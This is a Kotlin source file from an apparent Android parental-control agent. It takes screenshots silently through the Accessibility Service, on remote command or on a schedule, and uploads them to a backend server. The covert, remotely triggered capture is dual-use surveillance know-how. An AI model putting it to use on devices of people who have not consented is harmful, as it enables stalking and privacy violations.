package com.parental.agent.collectors.media

import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Display
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.services.AgentAccessibilityService
import com.parental.agent.sync.ApiConstants
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import kotlin.coroutines.resume

class ScreenshotCollector(private val context: Context) {

    companion object {
        private const val TAG = "ScreenshotCollector"
        private var scheduleJob: Job? = null

        fun activeScheduleRunning(): Boolean = scheduleJob?.isActive == true
    }

    suspend fun captureScreenshot(commandId: String? = null): Boolean = withContext(Dispatchers.IO) {
        val result = captureScreenBitmap()
        val success = result.first
        val errorMsg = result.second

        if (!commandId.isNullOrEmpty()) {
            notifyCommandStatus(
                commandId = commandId,
                status = if (success) "SUCCESS" else "FAILED",
                errorMsg = errorMsg
            )
        }

        return@withContext success
    }

    fun configureSchedule(scope: CoroutineScope, active: Boolean, durationMin: Int, intervalSec: Int, startTime: Long, stopTime: Long) {
        scheduleJob?.cancel()
        if (!active) {
            Log.i(TAG, "⏹️ Screenshot schedule stopped.")
            return
        }

        val now = System.currentTimeMillis()
        if (stopTime > 0 && now >= stopTime) {
            Log.w(TAG, "⚠️ Screenshot schedule expired while device was offline (now=$now, stopTime=$stopTime). Discarding.")
            return
        }

        Log.i(TAG, "⏰ Screenshot schedule configured: interval=${intervalSec}s, duration=${durationMin}m (startTime=$startTime, stopTime=$stopTime)")

        scheduleJob = scope.launch(Dispatchers.IO) {
            val currentNow = System.currentTimeMillis()
            if (startTime > currentNow) {
                val waitMs = startTime - currentNow
                Log.i(TAG, "⏳ Future start time set! Waiting ${waitMs / 1000}s (${waitMs / 60000}m) before starting capture loop...")
                delay(waitMs)
            }

            val intervalMs = (intervalSec * 1000L).coerceAtLeast(5000L) // Minimum 5s interval
            while (isActive && System.currentTimeMillis() < stopTime) {
                try {
                    captureScreenshot(commandId = null)
                } catch (e: Exception) {
                    Log.w(TAG, "Scheduled screenshot capture error: ${e.message}")
                }
                delay(intervalMs)
            }
            Log.i(TAG, "⏰ Screenshot schedule completed or stopped.")
        }
    }

    private suspend fun captureScreenBitmap(): Pair<Boolean, String?> = suspendCancellableCoroutine { continuation ->
        val prefs = AppPreferences(context)
        val deviceId = prefs.getDeviceId()
        if (deviceId.isEmpty()) {
            if (continuation.isActive) continuation.resume(Pair(false, "Device not registered"))
            return@suspendCancellableCoroutine
        }

        // Android 11+ (API 30+) AccessibilityService takeScreenshot API
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val service = AgentAccessibilityService.instance
            if (service == null) {
                Log.w(TAG, "AccessibilityService instance is not running.")
                if (continuation.isActive) continuation.resume(Pair(false, "Accessibility Service permission required for silent screenshots"))
                return@suspendCancellableCoroutine
            }

            try {
                service.takeScreenshot(Display.DEFAULT_DISPLAY, context.mainExecutor, object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(screenshot: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
                        CoroutineScope(Dispatchers.IO).launch {
                            try {
                                val hardwareBuffer = screenshot.hardwareBuffer
                                val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshot.colorSpace)
                                hardwareBuffer.close()

                                if (bitmap != null) {
                                    val success = saveAndUploadBitmap(bitmap, deviceId)
                                    bitmap.recycle()
                                    if (continuation.isActive) continuation.resume(Pair(success, if (success) null else "Upload failed"))
                                } else {
                                    if (continuation.isActive) continuation.resume(Pair(false, "Failed to decode screenshot bitmap"))
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Error processing screenshot bitmap: ${e.message}", e)
                                if (continuation.isActive) continuation.resume(Pair(false, "Error saving screenshot: ${e.message}"))
                            }
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.e(TAG, "Accessibility takeScreenshot failed with error code: $errorCode")
                        if (continuation.isActive) continuation.resume(Pair(false, "OS screenshot capture failed (code $errorCode)"))
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Exception calling takeScreenshot: ${e.message}", e)
                if (continuation.isActive) continuation.resume(Pair(false, "Exception taking screenshot: ${e.message}"))
            }
        } else {
            if (continuation.isActive) continuation.resume(Pair(false, "Silent screenshot requires Android 11 or higher"))
        }
    }

    private fun saveAndUploadBitmap(bitmap: Bitmap, deviceId: String): Boolean {
        return try {
            val timestamp = System.currentTimeMillis()
            val fileName = "screenshot_${timestamp}.jpg"
            val tempFile = File(context.cacheDir, fileName)

            FileOutputStream(tempFile).use { out ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
            }

            Log.i(TAG, "📸 Screenshot captured successfully (${tempFile.length() / 1024} KB). Uploading to backend...")
            val galleryCollector = PhotoGalleryCollector(context)
            val uploadSuccess = galleryCollector.uploadPhotoToServer(tempFile, deviceId, fileName, category = "SCREENSHOT")

            tempFile.delete()
            uploadSuccess
        } catch (e: Exception) {
            Log.e(TAG, "Error saving/uploading screenshot bitmap: ${e.message}", e)
            false
        }
    }

    private fun notifyCommandStatus(commandId: String, status: String, errorMsg: String? = null) {
        try {
            val prefs = AppPreferences(context)
            val deviceId = prefs.getDeviceId()
            val client = OkHttpClient()
            val baseUrl = ApiConstants.BASE_URL.trimEnd('/')
            val url = if (baseUrl.endsWith("/api/v1")) "$baseUrl/commands/status" else "$baseUrl/api/v1/commands/status"

            val json = org.json.JSONObject().apply {
                put("deviceId", deviceId)
                put("commandId", commandId)
                put("status", status)
                if (!errorMsg.isNullOrEmpty()) put("error", errorMsg)
            }

            val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().close()
            Log.i(TAG, "Posted screenshot command status: commandId=$commandId, status=$status")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to send screenshot command status: ${e.message}")
        }
    }
}
